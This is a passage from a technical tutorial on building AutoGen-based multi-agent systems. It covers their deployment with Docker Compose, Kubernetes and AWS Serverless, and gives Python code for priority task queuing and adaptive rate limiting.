**5. Integration Example: Bringing It All Together**

```python
# app.py
import os
import json
import logging
from typing import Dict, List, Any, Optional

import autogen
from dotenv import load_dotenv

from agent_framework.advanced_config import AutoGenConfig
from agent_framework.specialized_agents import SpecializedAgentFactory
from agent_framework.agent_groups import AgentGroupFactory
from agent_framework.custom_tools import register_tools_with_agent

# Load environment variables from .env file
load_dotenv()

# Initialize logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class AIAgentSystem:
    """Main class for the AI Agent System."""
    
    def __init__(self, config_path: Optional[str] = None):
        """
        Initialize the AI Agent System.
        
        Args:
            config_path: Optional path to configuration file
        """
        self.config = AutoGenConfig(config_path)
        
        # Initialize the tool configurations
        self.tools_config = {
            "vector_db": {
                "api_key": os.environ.get("VECTOR_DB_API_KEY", ""),
                "api_url": os.environ.get("VECTOR_DB_API_URL", "https://api.yourvectordb.com/v1"),
                "embedding_model": "text-embedding-ada-002"
            },
            "web_search": {
                "api_key": os.environ.get("SEARCH_API_KEY", ""),
                "search_engine": "bing"
            },
            "data_analysis": {
                "work_dir": "data_analysis_workspace"
            },
            "api_integration": {
                "api_configs": {
                    "weather": {
                        "base_url": "https://api.weatherapi.com/v1",
                        "headers": {
                            "key": os.environ.get("WEATHER_API_KEY", "")
                        },
                        "timeout": 10
                    },
                    "news": {
                        "base_url": "https://newsapi.org/v2",
                        "headers": {
                            "X-Api-Key": os.environ.get("NEWS_API_KEY", "")
                        },
                        "timeout": 10
                    }
                }
            }
        }
        
        # Create factories for building agents and groups
        self.agent_factory = SpecializedAgentFactory(self.config.get_llm_config())
        self.group_factory = AgentGroupFactory(self.config.get_llm_config())
        
        # Track created groups for reuse
        self.agent_groups = {}
    
    def create_group_chat_agents(self, user_input: str = None) -> Dict[str, Any]:
        """
        Create a group chat with multiple specialized agents.
        
        Args:
            user_input: Optional initial user input
            
        Returns:
            Dictionary containing the group chat components
        """
        # Create a user proxy agent with tools
        user_proxy = autogen.UserProxyAgent(
            name="User",
            human_input_mode="TERMINATE",  # Allow human input when needed
            max_consecutive_auto_reply=self.config.get_termination_config().get("max_consecutive_auto_reply", 10),
            code_execution_config=self.config.get_user_proxy_config().get("code_execution_config")
        )
        
        # Create the group chat
        group = self.group_factory.create_groupchat(user_proxy=user_proxy)
        
        # Cache the group for later use
        group_id = f"groupchat_{len(self.agent_groups) + 1}"
        self.agent_groups[group_id] = group
        
        # Return the group with its ID
        return {
            "group_id": group_id,
            **group
        }
    
    def create_hierarchical_team(self, user_input: str = None) -> Dict[str, Any]:
        """
        Create a hierarchical team with a manager and specialists.
        
        Args:
            user_input: Optional initial user input
            
        Returns:
            Dictionary containing the team components
        """
        # Create a user proxy agent with tools
        user_proxy = autogen.UserProxyAgent(
            name="User",
            human_input_mode="TERMINATE",
            max_consecutive_auto_reply=self.config.get_termination_config().get("max_consecutive_auto_reply", 10),
            code_execution_config=self.config.get_user_proxy_config().get("code_execution_config")
        )
        
        # Create the hierarchical team
        team = self.group_factory.create_hierarchical_team(user_proxy=user_proxy)
        
        # Register tools with each specialist agent
        for name, agent in team["team"]["specialists"].items():
            function_map = register_tools_with_agent(agent, self.tools_config)
            if hasattr(agent, 'function_map'):
                agent.function_map.update(function_map)
            else:
                # For newer AutoGen versions
                agent.update_function_map(function_map)
        
        # Cache the team for later use
        team_id = f"team_{len(self.agent_groups) + 1}"
        self.agent_groups[team_id] = team
        
        # Return the team with its ID
        return {
            "team_id": team_id,
            **team
        }
    
    def execute_agent_group(self, group_id: str, problem: str) -> Dict[str, Any]:
        """
        Execute an agent group on a problem.
        
        Args:
            group_id: ID of the agent group to use
            problem: Problem to solve
            
        Returns:
            Results of the execution
        """
        if group_id not in self.agent_groups:
            raise ValueError(f"Unknown group ID: {group_id}")
        
        group = self.agent_groups[group_id]
        
        # Execute the group on the problem
        return group["execute"](problem)
    
    def run_competitive_evaluation(self, problem: str) -> Dict[str, Any]:
        """
        Run a competitive evaluation where multiple agents solve a problem 
        and a judge evaluates their solutions.
        
        Args:
            problem: Problem to solve
            
        Returns:
            Evaluation results
        """
        # Create a user proxy agent with tools
        user_proxy = autogen.UserProxyAgent(
            name="User",
            human_input_mode="NEVER",
            max_consecutive_auto_reply=self.config.get_termination_config().get("max_consecutive_auto_reply", 10),
            code_execution_config=self.config.get_user_proxy_config().get("code_execution_config")
        )
        
        # Create the competitive evaluation team
        evaluation = self.group_factory.create_competitive_evaluation_team(user_proxy=user_proxy)
        
        # Execute the evaluation
        return evaluation["execute"](problem)

# Example usage
if __name__ == "__main__":
    # Initialize the system
    agent_system = AIAgentSystem()
    
    # Create a hierarchical team
    team = agent_system.create_hierarchical_team()
    team_id = team["team_id"]
    
    # Example problem to solve
    problem = """
    We need to analyze customer sentiment from our product reviews. The data is in a CSV format with the following columns:
    - review_id: unique identifier for each review
    - product_id: identifier for the product
    - rating: numeric rating (1-5)
    - review_text: the text of the review
    - review_date: date when the review was posted
    
    The goal is to:
    1. Analyze the sentiment of each review
    2. Identify common themes in positive and negative reviews
    3. Track sentiment trends over time
    4. Recommend actions based on the findings
    
    The data can be found in this CSV: https://example.com/customer_reviews.csv (Note: this is a placeholder URL)
    """
    
    # Execute the team on the problem
    results = agent_system.execute_agent_group(team_id, problem)
    
    # Print the final solution
    print("FINAL SOLUTION:")
    print(results.get("final_solution", "No solution found"))
```

### Deploying Your AI Agents with Docker, Kubernetes, or Cloud Hosting

Deploying AI agent systems at scale requires robust infrastructure. Here are detailed deployment approaches for different environments:

**Docker Deployment**

Create a `docker-compose.yml` for a comprehensive agent system:

```yaml
version: '3.8'

services:
  # API service for AI agents
  agent-api:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8000:8000"
    volumes:
      - ./app:/app
      - ./data:/data
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
      - PINECONE_API_KEY=${PINECONE_API_KEY}
      - PINECONE_ENVIRONMENT=${PINECONE_ENVIRONMENT}
      - DEBUG=False
      - LOG_LEVEL=INFO
      - DATABASE_URL=postgresql://postgres:postgres@postgres:5432/agent_db
    depends_on:
      - postgres
      - redis
    networks:
      - agent-network
    restart: unless-stopped
    command: uvicorn app.main:app --host 0.0.0.0 --port 8000
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

  # Celery worker for background tasks
  worker:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./app:/app
      - ./data:/data
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
      - PINECONE_API_KEY=${PINECONE_API_KEY}
      - PINECONE_ENVIRONMENT=${PINECONE_ENVIRONMENT}
      - DEBUG=False
      - LOG_LEVEL=INFO
      - DATABASE_URL=postgresql://postgres:postgres@postgres:5432/agent_db
    depends_on:
      - postgres
      - redis
    networks:
      - agent-network
    restart: unless-stopped
    command: celery -A app.celery_app worker --loglevel=info
    healthcheck:
      test: ["CMD", "celery", "-A", "app.celery_app", "inspect", "ping"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 40s

  # Celery beat for scheduled tasks
  scheduler:
    build:
      context: .
      dockerfile: Dockerfile
    volumes:
      - ./app:/app
      - ./data:/data
    environment:
      - OPENAI_API_KEY=${OPENAI_API_KEY}
      - PINECONE_API_KEY=${PINECONE_API_KEY}
      - PINECONE_ENVIRONMENT=${PINECONE_ENVIRONMENT}
      - DEBUG=False
      - LOG_LEVEL=INFO
      - DATABASE_URL=postgresql://postgres:postgres@postgres:5432/agent_db
    depends_on:
      - postgres
      - redis
    networks:
      - agent-network
    restart: unless-stopped
    command: celery -A app.celery_app beat --loglevel=info

  # Flower for monitoring Celery
  flower:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "5555:5555"
    environment:
      - CELERY_BROKER_URL=redis://redis:6379/0
      - FLOWER_BASIC_AUTH=${FLOWER_USER}:${FLOWER_PASSWORD}
    depends_on:
      - redis
      - worker
    networks:
      - agent-network
    restart: unless-stopped
    command: celery -A app.celery_app flower --port=5555

  # PostgreSQL database
  postgres:
    image: postgres:14
    ports:
      - "5432:5432"
    environment:
      - POSTGRES_USER=postgres
      - POSTGRES_PASSWORD=postgres
      - POSTGRES_DB=agent_db
    volumes:
      - postgres-data:/var/lib/postgresql/data
    networks:
      - agent-network
    restart: unless-stopped
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 10s
      timeout: 5s
      retries: 5

  # Redis for Celery broker and caching
  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"
    volumes:
      - redis-data:/data
    networks:
      - agent-network
    restart: unless-stopped
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5

  # Nginx for serving the frontend and API
  nginx:
    image: nginx:1.23-alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf
      - ./nginx/conf.d:/etc/nginx/conf.d
      - ./frontend/build:/usr/share/nginx/html
      - ./data/certbot/conf:/etc/letsencrypt
      - ./data/certbot/www:/var/www/certbot
    depends_on:
      - agent-api
    networks:
      - agent-network
    restart: unless-stopped

  # Prometheus for metrics
  prometheus:
    image: prom/prometheus:v2.40.0
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    networks:
      - agent-network
    restart: unless-stopped

  # Grafana for visualization
  grafana:
    image: grafana/grafana:9.3.0
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_USER=${GRAFANA_USER}
      - GF_SECURITY_ADMIN_PASSWORD=${GRAFANA_PASSWORD}
    volumes:
      - grafana-data:/var/lib/grafana
      - ./grafana/provisioning:/etc/grafana/provisioning
    depends_on:
      - prometheus
    networks:
      - agent-network
    restart: unless-stopped

networks:
  agent-network:
    driver: bridge

volumes:
  postgres-data:
  redis-data:
  prometheus-data:
  grafana-data:
```

**Kubernetes Deployment**

For large-scale enterprise deployments, Kubernetes provides advanced orchestration capabilities.

Create a namespace for your agent system:

```yaml
# agent-namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: ai-agents
  labels:
    name: ai-agents
```

ConfigMap for application settings:

```yaml
# agent-configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: agent-config
  namespace: ai-agents
data:
  LOG_LEVEL: "INFO"
  DEBUG: "False"
  CACHE_TTL: "3600"
  MAX_AGENT_INSTANCES: "10"
  ALLOWED_ORIGINS: "https://example.com,https://api.example.com"
  AGENT_TIMEOUT: "300"
  MONITORING_ENABLED: "True"
```

Secret for sensitive information:

```yaml
# agent-secrets.yaml
apiVersion: v1
kind: Secret
metadata:
  name: agent-secrets
  namespace: ai-agents
type: Opaque
data:
  OPENAI_API_KEY: <base64-encoded-key>
  PINECONE_API_KEY: <base64-encoded-key>
  PINECONE_ENVIRONMENT: <base64-encoded-value>
  POSTGRES_PASSWORD: <base64-encoded-password>
  REDIS_PASSWORD: <base64-encoded-password>
  ADMIN_API_KEY: <base64-encoded-key>
```

API Service deployment:

```yaml
# agent-api-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: agent-api
  namespace: ai-agents
  labels:
    app: agent-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: agent-api
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0
  template:
    metadata:
      labels:
        app: agent-api
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8000"
        prometheus.io/path: "/metrics"
    spec:
      containers:
      - name: agent-api
        image: your-registry/agent-api:1.0.0
        imagePullPolicy: Always
        ports:
        - containerPort: 8000
        resources:
          requests:
            memory: "1Gi"
            cpu: "500m"
          limits:
            memory: "2Gi"
            cpu: "1"
        env:
        - name: OPENAI_API_KEY
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: OPENAI_API_KEY
        - name: PINECONE_API_KEY
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: PINECONE_API_KEY
        - name: PINECONE_ENVIRONMENT
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: PINECONE_ENVIRONMENT
        - name: DATABASE_URL
          value: "postgresql://postgres:$(POSTGRES_PASSWORD)@postgres:5432/agent_db"
        - name: REDIS_URL
          value: "redis://:$(REDIS_PASSWORD)@redis:6379/0"
        envFrom:
        - configMapRef:
            name: agent-config
        readinessProbe:
          httpGet:
            path: /health
            port: 8000
          initialDelaySeconds: 15
          periodSeconds: 10
        livenessProbe:
          httpGet:
            path: /health
            port: 8000
          initialDelaySeconds: 30
          periodSeconds: 20
        volumeMounts:
        - name: agent-data
          mountPath: /data
      volumes:
      - name: agent-data
        persistentVolumeClaim:
          claimName: agent-data-pvc
```

Service to expose the API:

```yaml
# agent-api-service.yaml
apiVersion: v1
kind: Service
metadata:
  name: agent-api
  namespace: ai-agents
  labels:
    app: agent-api
spec:
  selector:
    app: agent-api
  ports:
  - port: 80
    targetPort: 8000
  type: ClusterIP
```

Worker deployment for processing tasks:

```yaml
# agent-worker-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: agent-worker
  namespace: ai-agents
  labels:
    app: agent-worker
spec:
  replicas: 5
  selector:
    matchLabels:
      app: agent-worker
  template:
    metadata:
      labels:
        app: agent-worker
    spec:
      containers:
      - name: agent-worker
        image: your-registry/agent-worker:1.0.0
        imagePullPolicy: Always
        resources:
          requests:
            memory: "2Gi"
            cpu: "1"
          limits:
            memory: "4Gi"
            cpu: "2"
        env:
        - name: OPENAI_API_KEY
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: OPENAI_API_KEY
        - name: PINECONE_API_KEY
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: PINECONE_API_KEY
        - name: PINECONE_ENVIRONMENT
          valueFrom:
            secretKeyRef:
              name: agent-secrets
              key: PINECONE_ENVIRONMENT
        - name: DATABASE_URL
          value: "postgresql://postgres:$(POSTGRES_PASSWORD)@postgres:5432/agent_db"
        - name: REDIS_URL
          value: "redis://:$(REDIS_PASSWORD)@redis:6379/0"
        - name: WORKER_CONCURRENCY
          value: "4"
        envFrom:
        - configMapRef:
            name: agent-config
        volumeMounts:
        - name: agent-data
          mountPath: /data
      volumes:
      - name: agent-data
        persistentVolumeClaim:
          claimName: agent-data-pvc
```

Horizontal Pod Autoscaler for dynamic scaling:

```yaml
# agent-api-hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: agent-api-hpa
  namespace: ai-agents
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: agent-api
  minReplicas: 3
  maxReplicas: 10
  metrics:
  - type: Resource
    resource:
      name: cpu
      target:
        type: Utilization
        averageUtilization: 70
  - type: Resource
    resource:
      name: memory
      target:
        type: Utilization
        averageUtilization: 80
  behavior:
    scaleUp:
      stabilizationWindowSeconds: 60
      policies:
      - type: Percent
        value: 100
        periodSeconds: 60
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
      - type: Percent
        value: 10
        periodSeconds: 120
```

Ingress for external access:

```yaml
# agent-ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: agent-ingress
  namespace: ai-agents
  annotations:
    kubernetes.io/ingress.class: nginx
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/proxy-body-size: "10m"
    nginx.ingress.kubernetes.io/proxy-read-timeout: "600"
    nginx.ingress.kubernetes.io/proxy-send-timeout: "600"
spec:
  tls:
  - hosts:
    - api.example.com
    secretName: agent-api-tls
  rules:
  - host: api.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: agent-api
            port:
              number: 80
```

**Cloud Hosting Options**

For serverless deployment on AWS, create a `serverless.yml` configuration:

```yaml
service: ai-agent-system

frameworkVersion: '3'

provider:
  name: aws
  runtime: python3.9
  stage: ${opt:stage, 'dev'}
  region: ${opt:region, 'us-west-2'}
  memorySize: 1024
  timeout: 30
  environment:
    OPENAI_API_KEY: ${ssm:/ai-agent/${self:provider.stage}/OPENAI_API_KEY~true}
    PINECONE_API_KEY: ${ssm:/ai-agent/${self:provider.stage}/PINECONE_API_KEY~true}
    PINECONE_ENVIRONMENT: ${ssm:/ai-agent/${self:provider.stage}/PINECONE_ENVIRONMENT}
    LOG_LEVEL: INFO
    STAGE: ${self:provider.stage}
  iam:
    role:
      statements:
        - Effect: Allow
          Action:
            - s3:GetObject
            - s3:PutObject
          Resource: 
            - "arn:aws:s3:::ai-agent-${self:provider.stage}/*"
        - Effect: Allow
          Action:
            - sqs:SendMessage
            - sqs:ReceiveMessage
            - sqs:DeleteMessage
            - sqs:GetQueueAttributes
          Resource: 
            - "arn:aws:sqs:${self:provider.region}:*:ai-agent-tasks-${self:provider.stage}"
        - Effect: Allow
          Action:
            - dynamodb:GetItem
            - dynamodb:PutItem
            - dynamodb:UpdateItem
            - dynamodb:DeleteItem
            - dynamodb:Query
            - dynamodb:Scan
          Resource: 
            - "arn:aws:dynamodb:${self:provider.region}:*:table/ai-agent-${self:provider.stage}"

functions:
  api:
    handler: app.handlers.api_handler
    events:
      - httpApi:
          path: /api/{proxy+}
          method: any
    environment:
      FUNCTION_TYPE: API
    memorySize: 1024
    timeout: 30

  agent-executor:
    handler: app.handlers.agent_executor
    events:
      - sqs:
          arn:
            Fn::GetAtt:
              - AgentTasksQueue
              - Arn
          batchSize: 1
          maximumBatchingWindow: 10
    environment:
      FUNCTION_TYPE: WORKER
    memorySize: 2048
    timeout: 900  # 15 minutes for long-running tasks
    reservedConcurrency: 50  # Limit concurrent executions

  scheduler:
    handler: app.handlers.scheduler_handler
    events:
      - schedule: rate(5 minutes)
    environment:
      FUNCTION_TYPE: SCHEDULER
    timeout: 60

resources:
  Resources:
    AgentTasksQueue:
      Type: AWS::SQS::Queue
      Properties:
        QueueName: ai-agent-tasks-${self:provider.stage}
        VisibilityTimeout: 900
        MessageRetentionPeriod: 86400

    AgentTasksTable:
      Type: AWS::DynamoDB::Table
      Properties:
        TableName: ai-agent-${self:provider.stage}
        BillingMode: PAY_PER_REQUEST
        AttributeDefinitions:
          - AttributeName: id
            AttributeType: S
          - AttributeName: user_id
            AttributeType: S
          - AttributeName: status
            AttributeType: S
          - AttributeName: created_at
            AttributeType: S
        KeySchema:
          - AttributeName: id
            KeyType: HASH
        GlobalSecondaryIndexes:
          - IndexName: UserIndex
            KeySchema:
              - AttributeName: user_id
                KeyType: HASH
              - AttributeName: created_at
                KeyType: RANGE
            Projection:
              ProjectionType: ALL
          - IndexName: StatusIndex
            KeySchema:
              - AttributeName: status
                KeyType: HASH
              - AttributeName: created_at
                KeyType: RANGE
            Projection:
              ProjectionType: ALL

    AgentDataBucket:
      Type: AWS::S3::Bucket
      Properties:
        BucketName: ai-agent-${self:provider.stage}
        VersioningConfiguration:
          Status: Enabled
        LifecycleConfiguration:
          Rules:
            - Id: ExpireOldVersions
              Status: Enabled
              NoncurrentVersionExpiration:
                NoncurrentDays: 30
```

## 6. Optimizing and Scaling AI Agents for Enterprise Use

### Best Practices for Efficient AI Task Orchestration

Efficient orchestration of AI agent tasks is critical for building scalable enterprise systems. Here are key best practices:

**1. Implement Task Prioritization and Queuing**

```python
# task_orchestration/priority_queue.py
import heapq
import time
import threading
import uuid
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field

@dataclass(order=True)
class PrioritizedTask:
    """A task with priority for the queue."""
    priority: int
    created_at: float = field(default_factory=time.time)
    task_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    task_type: str = field(default="", compare=False)
    payload: Dict[str, Any] = field(default_factory=dict, compare=False)
    callback: Optional[Callable] = field(default=None, compare=False)
    
    def __post_init__(self):
        # Lower number = higher priority
        # Negate created_at to prioritize older tasks within same priority
        self.priority = (self.priority, self.created_at)

class PriorityTaskQueue:
    """Thread-safe priority queue for AI agent tasks."""
    
    PRIORITY_HIGH = 1
    PRIORITY_MEDIUM = 2
    PRIORITY_LOW = 3
    
    def __init__(self):
        self._queue = []
        self._lock = threading.RLock()
        self._task_map = {}  # Maps task_id to position in queue for O(1) lookups
    
    def push(self, task: PrioritizedTask) -> str:
        """Add a task to the queue with proper priority."""
        with self._lock:
            heapq.heappush(self._queue, task)
            self._task_map[task.task_id] = task
            return task.task_id
    
    def pop(self) -> Optional[PrioritizedTask]:
        """Get the highest priority task from the queue."""
        with self._lock:
            if not self._queue:
                return None
            task = heapq.heappop(self._queue)
            if task.task_id in self._task_map:
                del self._task_map[task.task_id]
            return task
    
    def peek(self) -> Optional[PrioritizedTask]:
        """View the highest priority task without removing it."""
        with self._lock:
            if not self._queue:
                return None
            return self._queue[0]
    
    def remove(self, task_id: str) -> bool:
        """Remove a specific task by ID."""
        with self._lock:
            if task_id not in self._task_map:
                return False
            
            # Note: This is inefficient in heapq, but we keep the _task_map for fast lookups
            # In a production system with frequent removals, consider a different data structure
            self._queue = [task for task in self._queue if task.task_id != task_id]
            heapq.heapify(self._queue)
            del self._task_map[task_id]
            return True
    
    def get_task(self, task_id: str) -> Optional[PrioritizedTask]:
        """Get a task by ID without removing it."""
        with self._lock:
            return self._task_map.get(task_id)
    
    def size(self) -> int:
        """Get the number of tasks in the queue."""
        with self._lock:
            return len(self._queue)
    
    def update_priority(self, task_id: str, new_priority: int) -> bool:
        """Update the priority of a task."""
        with self._lock:
            if task_id not in self._task_map:
                return False
            
            # Remove and re-add with new priority
            task = self._task_map[task_id]
            self.remove(task_id)
            task.priority = new_priority
            self.push(task)
            return True

# Example orchestrator that uses the priority queue
class AgentTaskOrchestrator:
    """Orchestrates tasks across multiple AI agents with priority queuing."""
    
    def __init__(self, max_workers=10):
        self.task_queue = PriorityTaskQueue()
        self.results = {}
        self.max_workers = max_workers
        self.running_tasks = set()
        self.workers = []
        self.stop_event = threading.Event()
    
    def start(self):
        """Start the orchestrator with worker threads."""
        self.stop_event.clear()
        
        # Create worker threads
        for i in range(self.max_workers):
            worker = threading.Thread(target=self._worker_loop, args=(i,))
            worker.daemon = True
            worker.start()
            self.workers.append(worker)
    
    def stop(self):
        """Stop the orchestrator and all workers."""
        self.stop_event.set()
        for worker in self.workers:
            worker.join(timeout=1.0)
        self.workers = []
    
    def schedule_task(self, task_type: str, payload: Dict[str, Any], 
                     priority: int = PriorityTaskQueue.PRIORITY_MEDIUM) -> str:
        """Schedule a task for execution."""
        task = PrioritizedTask(
            priority=priority,
            task_type=task_type,
            payload=payload
        )
        task_id = self.task_queue.push(task)
        return task_id
    
    def get_result(self, task_id: str) -> Dict[str, Any]:
        """Get the result of a task if available."""
        return self.results.get(task_id, {"status": "unknown"})
    
    def _worker_loop(self, worker_id: int):
        """Worker thread that processes tasks from the queue."""
        while not self.stop_event.is_set():
            task = self.task_queue.pop()
            
            if not task:
                time.sleep(0.1)
                continue
            
            try:
                self.running_tasks.add(task.task_id)
                self.results[task.task_id] = {"status": "running"}
                
                # Route task to appropriate handler based on task_type
                if task.task_type == "agent_execution":
                    result = self._execute_agent_task(task.payload)
                elif task.task_type == "agent_conversation":
                    result = self._process_conversation(task.payload)
                elif task.task_type == "data_processing":
                    result = self._process_data(task.payload)
                else:
                    result = {"error": f"Unknown task type: {task.task_type}"}
                
                # Store the result
                self.results[task.task_id] = {
                    "status": "completed",
                    "result": result,
                    "completed_at": time.time()
                }
                
                # Execute callback if provided
                if task.callback:
                    task.callback(task.task_id, result)
                
            except Exception as e:
                # Handle task execution errors
                self.results[task.task_id] = {
                    "status": "failed",
                    "error": str(e),
                    "completed_at": time.time()
                }
            finally:
                self.running_tasks.discard(task.task_id)
    
    def _execute_agent_task(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Execute an AI agent task."""
        # Implementation would depend on the specific agent framework
        agent_type = payload.get("agent_type")
        parameters = payload.get("parameters", {})
        
        # This would call your actual agent implementation
        # For example:
        # from agent_framework import get_agent
        # agent = get_agent(agent_type)
        # return agent.execute(parameters)
        
        # Placeholder implementation
        time.sleep(2)  # Simulate work
        return {
            "agent_type": agent_type,
            "status": "executed",
            "payload": parameters
        }
    
    def _process_conversation(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Process a conversation message with an AI agent."""
        # Implementation for conversation processing
        # Placeholder implementation
        time.sleep(1)  # Simulate work
        return {
            "message_processed": True,
            "response": "This is a simulated agent response"
        }
    
    def _process_data(self, payload: Dict[str, Any]) -> Dict[str, Any]:
        """Process data with an AI agent."""
        # Implementation for data processing
        # Placeholder implementation
        time.sleep(3)  # Simulate work
        return {
            "data_processed": True,
            "records_processed": 42
        }
```

**2. Implement Rate Limiting and Adaptive Concurrency**

```python
# task_orchestration/rate_limiter.py
import time
import threading
import logging
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class RateLimitRule:
    """Rule for rate limiting."""
    calls_per_minute: int
    max_burst: int
    scope: str  # 'global', 'model', 'api_key', etc.

class TokenBucket:
    """Token bucket algorithm implementation for rate limiting."""
    
    def __init__(self, rate: float, max_tokens: int):
        """
        Initialize a token bucket.
        
        Args:
            rate: Tokens per second
            max_tokens: Maximum tokens the bucket can hold
        """
        self.rate = rate
        self.max_tokens = max_tokens
        self.tokens = max_tokens
        self.last_refill = time.time()
        self.lock = threading.RLock()
    
    def _refill(self):
        """Refill the bucket based on elapsed time."""
        now = time.time()
        elapsed = now - self.last_refill
        refill = elapsed * self.rate
        
        with self.lock:
            self.tokens = min(self.max_tokens, self.tokens + refill)
            self.last_refill = now
    
    def consume(self, tokens: int = 1) -> bool:
        """
        Consume tokens from the bucket.
        
        Args:
            tokens: Number of tokens to consume
            
        Returns:
            True if tokens were consumed, False if not enough tokens
        """
        self._refill()
        
        with self.lock:
            if tokens <= self.tokens:
                self.tokens -= tokens
                return True
            return False
    
    def wait_for_tokens(self, tokens: int = 1, timeout: Optional[float] = None) -> bool:
        """
        Wait until the requested tokens are available.
        
        Args:
            tokens: Number of tokens to consume
            timeout: Maximum time to wait in seconds
            
        Returns:
            True if tokens were consumed, False if timeout occurred
        """
        if timeout is not None:
            deadline = time.time() + timeout
        
        while True:
            self._refill()
            
            with self.lock:
                if tokens <= self.tokens:
                    self.tokens -= tokens
                    return True
            
            if timeout is not None and time.time() >= deadline:
                return False
            
            # Wait for some time before retrying
            sleep_time = max(0.01, tokens / self.rate)
            time.sleep(min(sleep_time, 0.1))

class AdaptiveRateLimiter:
    """
    Rate limiter with adaptive concurrency based on response times and error rates.
    Dynamically adjusts concurrency levels for optimal throughput.
    """
    
    def __init__(self, 
                 initial_rate: float = 10.0, 
                 initial_concurrency: int = 5,
                 min_concurrency: int = 1,
                 max_concurrency: int = 50,
                 target_success_rate: float = 0.95,
                 target_latency: float = 1.0):
        """
        Initialize the adaptive rate limiter.
        
        Args:
            initial_rate: Initial rate limit (requests per second)
            initial_concurrency: Initial concurrency level
            min_concurrency: Minimum concurrency level
            max_concurrency: Maximum concurrency level
            target_success_rate: Target success rate (0-1)
            target_latency: Target latency in seconds
        """
        self.bucket = TokenBucket(initial_rate, initial_rate * 2)  # Allow 2 seconds of burst
        self.concurrency = initial_concurrency
        self.min_concurrency = min_concurrency
        self.max_concurrency = max_concurrency
        self.target_success_rate = target_success_rate
        self.target_latency = target_latency
        
        # Stats tracking
        self.success_count = 0
        self.error_count = 0
        self.latencies = []
        self.latency_window = 100  # Keep last 100 latencies
        
        # Semaphore for concurrency control
        self.semaphore = threading.Semaphore(initial_concurrency)
        
        # Adaptive adjustment
        self.adjustment_thread = threading.Thread(target=self._adjustment_loop, daemon=True)
        self.adjustment_thread.start()
    
    def execute(self, func: Callable, *args, **kwargs) -> Any:
        """
        Execute a function with rate limiting and concurrency control.
        
        Args:
            func: Function to execute
            *args, **kwargs: Arguments to pass to the function
            
        Returns:
            Result of the function
        """
        # Wait for token from the bucket
        if not self.bucket.wait_for_tokens(1, timeout=30):
            raise RuntimeError("Rate limit exceeded - no tokens available")
        
        # Wait for concurrency slot
        acquired = self.semaphore.acquire(timeout=30)
        if not acquired:
            raise RuntimeError("Concurrency limit exceeded - no slot available")
        
        start_time = time.time()
        success = False
        
        try:
            result = func(*args, **kwargs)
            success = True
            return result
        finally:
            execution_time = time.time() - start_time
            self.semaphore.release()
            
            # Update stats
            if success:
                self.success_count += 1
            else:
                self.error_count += 1
            
            self.latencies.append(execution_time)
            if len(self.latencies) > self.latency_window:
                self.latencies.pop(0)
    
    def get_current_limits(self) -> Dict[str, Any]:
        """Get current rate limits and stats."""
        success_rate = self.success_count / max(1, self.success_count + self.error_count)
        avg_latency = sum(self.latencies) / max(1, len(self.latencies))
        
        return {
            "rate_limit": self.bucket.rate,
            "concurrency": self.concurrency,
            "success_rate": success_rate,
            "average_latency": avg_latency,
            "requests_processed": self.success_count + self.error_count
        }
    
    def _adjustment_loop(self):
        """Background thread that adjusts rate limits based on performance."""
        while True:
            time.sleep(10)  # Adjust every 10 seconds
            
            if self.success_count + self.error_count < 10:
                # Not enough data to make adjustments
                continue
            
            # Calculate metrics
            success_rate = self.success_count / max(1, self.success_count + self.error_count)
            avg_latency = sum(self.latencies) / max(1, len(self.latencies))
            
            # Reset counters
            self.success_count = 0
            self.error_count = 0
            
            # Adjust based on success rate and latency
            if success_rate < self.target_success_rate:
                # Too many errors, reduce concurrency and rate
                new_concurrency = max(self.min_concurrency, int(self.concurrency * 0.8))
                new_rate = max(1.0, self.bucket.rate * 0.8)
                
                logger.info(f"Reducing limits due to errors: concurrency {self.concurrency} -> {new_concurrency}, "
